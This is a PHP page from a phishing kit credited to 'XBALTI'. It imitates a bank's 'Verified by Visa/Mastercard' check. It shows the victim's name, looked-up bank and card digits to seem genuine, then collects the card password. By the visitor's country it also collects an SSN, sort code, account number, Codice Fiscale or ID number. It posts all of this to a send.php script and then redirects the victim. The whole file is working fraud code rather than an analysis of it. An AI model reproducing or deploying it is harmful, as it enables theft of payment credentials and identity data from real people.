<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                     
*/
session_start();
$bin        = str_replace(' ', '', $_SESSION['cardNumber']);
$bin        = substr($bin, 0, 6);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['cctype'] = $cctype   = $details->scheme;
$_SESSION['bankname'] = $namebank   = $details->bank->name;
 if ($_SESSION['cctype'] == "mastercard"){
      }
   if ($_SESSION['cctype'] == "visa" ){
      }

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['country'] = $country   = $details->country;
$_SESSION['countryCode'] = $countryCode   = $details->countryCode;
?>
<html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; width=device-width, initial-scale=1">
    <meta charset="utf8">
    <title>Verified by <?php echo $_SESSION['cctype']; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="robots" content="noindex">
    <link href="./css/yassin.css" type="text/css" rel="stylesheet">
        <link href="./css/hanan.css" type="text/css" rel="stylesheet">

        
	<script type="text/javascript">
	    function bani(){
            document.getElementById("VBVIYA").value="";
            document.getElementById("VBVIYA").type="text";
        }
        function ghebri(){
            if(document.getElementById("VBVIYA").value==""){
                document.getElementById("VBVIYA").type="password";
                document.getElementById("VBVIYA").value="";
            }
            else{   
                document.getElementById("VBVIYA").type="password";
            }
            }
	</script>
	<style>
    #loadload {
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            position: fixed;
            display: block;
            opacity: .9;
            background-color: #fff;
            z-index: 99;
            text-align: center;
        }
        
#loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
                .d {
                    color: red
                }
    </style>
</head>
<body><BR>
    <BR>
    
<div style="background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto;" class="content_check ">
   <?php
    if ($_SESSION['cctype'] == "visa" ){
    echo '<img src="./img/verivs.gif" style=" margin-left: 29px; margin-top: 26px;" >';
    }
    elseif ($_SESSION['cctype'] == "mastercard"  ){
    echo '<img src="./img/verims.gif" style=" margin-left: 29px; margin-top: 26px;" >';
    }
    ?> 
	
    <img src="./img/logontfx.png" style="float: right;display: inline-block ; margin-top: 33px; padding-right: 1em;" width="128px" >

    <p class="sub" style="font-family:Arial;font-size: 14px;margin-top: 45px;color: #1C54A3;margin-left:1em;text-align: center;font-weight: bold;"></p>
    <p class="sub" style="font-family:pp-sans-small-regular, Helvetica Neue, Arial, sans-serif;font-size: 17px;margin-top: -6px;color: #807979;margin-left:1em;text-align: center;font-weight: 700;">  </p>
	<br><table align="center" width="100%" style="font-size: 13px;font-family:pp-sans-small-regular, Helvetica Neue, Arial, sans-serif; color: black;margin-left: 5%;">        <tbody>
        <tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Name On Card : </td>
            <td style="font-size: 1.05em;"><?php echo $_SESSION['NameOnCard']; ?></td>
        </tr>
		<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Bank Name : </td>
            <td style="font-size: 1.05em;"><?php echo $_SESSION['bankname']; ?></td>
    </tr> 
    <tr>
    <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Card Number : </td>
        <td  style="font-size: 1.1em;">
            <?php if ($_SESSION['cctype'] == "visa"  ){
    echo '<span id="mastercard" class="img_small shadow  visaimg card-icons"></span>';
      } 
   else if ($_SESSION['cctype'] == "mastercard"  ){
     echo  '<span id="mastercard" class="img_small shadow  mastercardimg card-icons"></span>';
           }
        ?>   
           - <?=substr($_SESSION['cardNumber'] , -4);?>
       </td>
        </tr>
		<tr>
			</tr><tr>
		</tr>
		<div id="loadload" class="loadload" style="display: none;" > <img id="loading-image" src="./img/loadvbv.gif" /> </div>
        <form method="post" id="formvbv" name="formvbv" action="">
		<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Password :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="password" placeholder="" name="password_vbv" required="" id="VBVIYA" onclick="bani();" onblur="ghebri();" >
            </td>
            </tr>  




            
            <?php
		    				if($_SESSION['countryCode'] == "IT") {	
								echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Codice Fiscale :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" placeholder="Codice Fiscale" type="tel" name="codicefiscale" id="codicefiscale" required=""  >
            </td>
            </tr> ';  
		    				}

		    				elseif($_SESSION['countryCode'] == "CH" || $_SESSION['countryCode'] == "DE") {	
								echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Kontonummer :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="kontonummer" id="kontonummer" placeholder="Kontonummer" >
            </td>
            </tr>';  
		    				}

		    				elseif($_SESSION['countryCode'] == "GR") {	
								echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Official ID :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="offid" id="offid" placeholder="Official ID" >
            </td>
            </tr>';  
		    				}
	
		    				elseif($_SESSION['countryCode'] == "AU") {
			    				echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">OSID :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="osid" id="osid" placeholder="OSID" >
            </td>
            </tr>';
		    		}

		    				elseif ($_SESSION['countryCode'] == "IE" || $_SESSION['countryCode'] == "GB" ) {
		        				echo ' <tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Sort Code :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="sortcode" id="sortcode" placeholder="Sort Code" >
            </td>
            </tr>';			   
			    }

							elseif ($_SESSION['countryCode'] == "US" ) {
			    				echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">SSN :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="ssn" id="ssn" placeholder="Social Security number" >
            </td>
            </tr>';
							}	
						?>
            

			
            <tr>
            <td style="font-size: 1.05em;"></td>
            <td style="font-size: 1.05em;"><br>
                <input type="submit" value="Submit" style="font-size: 12px;color: #e50914;font-weight: bold;font-size: 1.05em;">
                
            </td>
        </tr>
  </form>
       </tbody>
    </table>
	
    <p style="text-align:center;font-family: arial, sans-serif;font-size: 9px;color: #656565;margin-top: 17px;padding-bottom: 30px;">
        Copyright © 2019 <?php echo $_SESSION['bankname']; ?> - All rights reserved.
    </p>
	
</div>
    <script src="./js/jquery.min.js"></script>
    <script src="./js/jquery.validate.min.js"></script>
<script>
         $(function() {


  $("form[name='formvbv']").validate({

    rules: {
      vbv: "required",
      codicefiscale: "required",
      offid : "required",
      osid : "required",
      VBVIYA : "required",
      sortcode : "required",
      accnumber : "required",
        ssn : "required",
       mmname : "required",
    },

       messages: {
      vbv: "",
      codicefiscale: "",
      offid : "",
      osid : "",
      VBVIYA : "",
      sortcode : "",
      accnumber : "",
        ssn : "",
       mmname : "",
    },
     submitHandler: function(form) {
            $("#loadload").show();
                 $.post("XBALTI/send.php", $("#formvbv").serialize(), function(result) {
                          setTimeout(function() {
                                $(location).attr("href", "Congratulation");
                        },2000);
            });
        },
  
    });

});


    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
    $('input[name="sortcode"]').mask('00-00-00');
        $('input[name="ssn"]').mask('000-00-0000');
    </script>
</body>
</html>